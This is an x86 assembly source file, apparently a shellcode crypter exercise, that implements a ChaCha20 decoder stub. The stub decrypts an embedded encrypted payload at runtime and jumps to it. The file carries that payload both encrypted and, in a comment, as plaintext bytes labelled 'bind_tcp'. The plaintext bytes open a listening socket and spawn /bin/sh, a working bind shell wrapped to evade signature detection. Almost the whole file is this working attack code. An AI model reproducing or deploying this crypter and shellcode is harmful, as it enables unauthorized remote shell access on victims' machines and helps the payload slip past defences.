; Author: @bugsam
; Date: 08/29/2020
global _start

; check RFC7539
section .text
_start:
	add ax, 0x01ab
	jmp eax
	;;jmp payload

; the chacha quarter round function
; input: four 32-bit integer a, b, c and d
; output: quarterround(a, b, c, d)
qr:
	push ebp
	mov ebp, esp
				; qr(a,b,c,d) where a, b, c and d (dword)

	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x10		; d <<< 16

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0xc		; b <<< 12
	
	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x8		; d <<< 8

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0x7		; b <<< 7
	
	leave			
	ret

roundh: 	
	push ebp
	mov ebp, esp
	push 0x09
	pop ecx			; 20 rounds (Nr/2-1)
				; Nr (Rounds number)
round_l:
	push ecx
	; odd number
	; first line
	mov eax, [edi]
	mov ebx, [edi+16]
	mov ecx, [edi+32]
	mov edx, [edi+48]
	call qr			; QR(v0,v4,v8,v12)
	
	mov [edi], eax
	mov [edi+16], ebx
	mov [edi+32], ecx
	mov [edi+48], edx
	
	; second line
	mov eax, [edi+4]
	mov ebx, [edi+20]	
	mov ecx, [edi+36]
	mov edx, [edi+52]
	call qr			; QR(v1,v5,v9,v13)
	
	mov [edi+4], eax
	mov [edi+20], ebx
	mov [edi+36], ecx
	mov [edi+52], edx
	
	; third line
	mov eax, [edi+8]
	mov ebx, [edi+24]	
	mov ecx, [edi+40]
	mov edx, [edi+56]
	call qr			; QR(v2,v6,v10,v14)
	
	mov [edi+8], eax
	mov [edi+24], ebx
	mov [edi+40], ecx
	mov [edi+56], edx
	
	; fourth line
	mov eax, [edi+12]
	mov ebx, [edi+28]
	mov ecx, [edi+44]
	mov edx, [edi+60]
	call qr			; QR(v3,v7,v11,v15)
	
	mov [edi+12], eax
	mov [edi+28], ebx
	mov [edi+44], ecx
	mov [edi+60], edx
	
	; even number
	; first line
	mov eax, [edi]	
	mov ebx, [edi+20]
	mov ecx, [edi+40]
	mov edx, [edi+60]
	call qr			; QR(v0,v5,v10,v15)
	
	mov [edi], eax
	mov [edi+20], ebx
	mov [edi+40], ecx
	mov [edi+60], edx
	
	; second line
	mov eax, [edi+4]
	mov ebx, [edi+24]
	mov ecx, [edi+44]
	mov edx, [edi+48]
	call qr			; QR(v1,v6,v11,v12)
	
	mov [edi+4], eax
	mov [edi+24], ebx
	mov [edi+44], ecx
	mov [edi+48], edx
	
	; third line
	mov eax, [edi+8]
	mov ebx, [edi+28]
	mov ecx, [edi+32]
	mov edx, [edi+52]
	call qr			; QR(v2,v7,v8,v13)
	
	mov [edi+8], eax
	mov [edi+28], ebx
	mov [edi+32], ecx
	mov [edi+52], edx
	
	; fourth line
	mov eax, [edi+12]
	mov ebx, [edi+16]
	mov ecx, [edi+36]
	mov edx, [edi+56]
	nop			; avoids NULL byte into next call
	call qr			; QR(v3,v4,v9,v14)
	
	mov [edi+12], eax
	mov [edi+16], ebx
	mov [edi+36], ecx
	mov [edi+56], edx
	
	pop ecx
	dec ecx
	jnz round_l
	
	leave
	ret

addmatrix:
	push ebp
	mov ebp, esp
	xor ebx, ebx
	push 0x10
	pop ecx				; interact with all blocks
		
addmatrix_l:
	mov eax, [edi+ebx]		; EDI: matrixv
	add eax, [esi+ebx]		; ESI: matrixm
	bswap eax			; little endian conversion
	mov [edi+ebx], eax		; matrixv+offset

	add ebx, 0x04
	loop addmatrix_l

	leave
	ret

xorstream:
	push ebp
	mov ebp, esp
	xor ebx, ebx
	push edi
	push esi

xorstream_l:
	mov esi, [esp]
	add esi, ebx		; ESI: matrixm
	mov edi, [esp+0x4]
	add edi, ebx		; EDI: ciphertext payload
	mov eax, edi		; dword location
	push dword[esi]
	push dword[edi]
	pop edx
	pop esi

	xor edx, esi		; xor ciphertext with keystream
	mov [eax], dl		; restore word location

	inc ebx			; next byte
	loop xorstream_l
		
	leave
	ret

; computation of a 64-byte block of the stream of Chacha
; input: key, nonce, block counter stored in matrix M
; output: a 64-byte block of the stream
block:	
	pop esi			; ESI: matrixm
	push esi	
	mov ebx, [esi+0x30]	; EBX: matrixm[12]
	inc ebx			; increments block counter
	mov [esi+0x30], ebx	; ESI+0x30: saves block counter

				; esi: matrixm
				; esi+0x40: matrixv
				; esi+0x80: shellcode
	
	push ecx		; stream counter
	mov cl, 0x10		; ECX (matrix size) 0x10
		 		; ESI: matrixm
	lea edi, [esi+0x40]	; EDI: matrixv
	cld			; increment index of ESI|EDI
	rep movsd		
	xchg edi, esi		
	mov dl, 0x80
	sub si, dx
	
	call roundh		; mix matrixv
	call addmatrix		; matrixm + matrixv
	
	pop ecx
	push edi	
	pop esi
	add edi, 0x50		; matrixv+0x10: shellcode
	add edi, ecx
	cmp ecx, 0x40		; check what block is being executed
	push ecx
	cmovle ecx, [esp+0x8]	; second block
	cmovg ecx, [esp+0xc]	; third block
	
	call xorstream		; matrixv xor shellcode_encoded
	pop ecx
	add ecx, 0x40
	cmp ecx, 0x80
	jle block
	
	sub eax, 0x95		; offset shellcode
	jmp eax
	;jmp shellcode

payload:
	xor ecx, ecx
	push 0xe		; last block size
	push 0x40		; normal block size (64-bytes)
	call block	
	matrixm: db 0x61, 0x70, 0x78, 0x65, \
		0x33, 0x20, 0x64, 0x6e, \
		0x79, 0x62, 0x2d, 0x32, \
		0x6b, 0x20, 0x65, 0x74, \
		0x44, 0x52, 0x4f, 0x57, \
		0x53, 0x53, 0x41, 0x50, \
		0x47, 0x4e, 0x4f, 0x4c, \
		0x47, 0x4e, 0x4f, 0x4c, \
		0x44, 0x52, 0x4f, 0x57, \
		0x53, 0x53, 0x41, 0x50, \
		0x47, 0x4e, 0x4f, 0x4c, \
		0x47, 0x4e, 0x4f, 0x4c, \
		0xff, 0xff, 0xff, 0xff
		db 0x45, 0x43, 0x4e, 0x4f, \
		0x4e, 0x45, 0x43, 0x4e, \
		0x4f, 0x4e, 0x45, 0x43

		; cccccccc  cccccccc  cccccccc  cccccccc
		; kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
		; kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
		; bbbbbbbb  nnnnnnnn  nnnnnnnn  nnnnnnnn
	
		; c=constant k=key b=blockcount n=nonce
		; c0 = 61707865, c1 = 3320646E, c2 = 79622D32, and c3 = 6B206574 are predefined constants;
		; blockcount = 32-bit initial counter (ups to 256GB)
 		; nonce = 96-bit nonce, also known as Initialization Vector
	
	matrixv: times 80 nop		; 512-bits + 128-bits extra (shellcode execution)

	; bind_tcp (have to XOR)
	; size 0x8e (142)
	;;shellcode: db 0x31,0xff,0x31,0xd2,0x31,0xdb,0x31,0xc0,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xb3,0x01,0xb0,0x66,0xcd,0x80,0x31,0xd2,0x52,0x66,0xba,0x05,0x39,0xc1,0xe2,0x10,0xb2,0x02,0x52,0x89,0xe1,0x6a,0x10,0x51,0x50,0x89,0xe1,0xb3,0x02,0xb0,0x66,0xcd,0x80,0x5a,0x57,0x52,0x89,0xe1,0xb3,0x04,0xb0,0x66,0xcd,0x80,0x57,0x57,0x89,0xe1,0x57,0x57,0x52,0x89,0xe1,0xb3,0x05,0xb0,0x66,0xcd,0x80,0x31,0xc9,0xb1,0x02,0x89,0xc3,0x51,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x59,0x49,0x7d,0xf5,0xeb,0x1c,0x5e,0x31,0xdb,0x8d,0x4e,0x0d,0x89,0x0e,0x89,0x5e,0x04,0x88,0x5e,0x0f,0x8d,0x56,0x04,0x8d,0x0e,0x8d,0x5e,0x08,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0xe8,0xdf,0xff,0xff,0xff,0x5a,0x5a,0x5a,0x5a,0x4e,0x4e,0x4e,0x4e,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x4e
	shellcode: db 0xd4,0xa0,0xd0,0xc4,0x8c,0x33,0x4f,0xb9,0x96,0x59,0x95,0xab,0x3c,0x91,0xa8,0x42,0xfc,0x94,0x15,0x36,0x76,0x28,0x57,0xec,0x15,0x49,0xce,0xc2,0xaa,0x8f,0xad,0x3a,0x13,0xe9,0xe9,0x6f,0xed,0x76,0x3d,0x87,0xee,0xa5,0xcd,0x47,0x78,0xc5,0x1d,0x59,0xe9,0xe8,0x54,0xfc,0x8f,0x50,0xf8,0x8f,0x78,0xa3,0xd6,0x81,0x33,0x95,0xe8,0x62,0xad,0xe7,0xfb,0x8b,0x98,0x50,0x49,0x9a,0x33,0xbe,0x8e,0x60,0xf7,0x0a,0x4d,0x01,0x31,0x36,0x0c,0x18,0x02,0xbf,0x82,0x29,0xf1,0xe9,0x76,0xc6,0xb6,0xa9,0xcf,0xce,0xa8,0xad,0x9d,0x46,0x59,0x8e,0x29,0x9b,0x95,0x87,0x89,0x74,0xbd,0xaa,0x58,0xfc,0x33,0x10,0x53,0x07,0x9e,0xa9,0x2c,0xe7,0x77,0xff,0x7c,0x8b,0xd3,0x41,0x61,0x59,0x46,0x69,0x19,0x03,0x24,0xa5,0x60,0x92,0x9e,0x4a,0x3b,0xdc,0xda,0x44
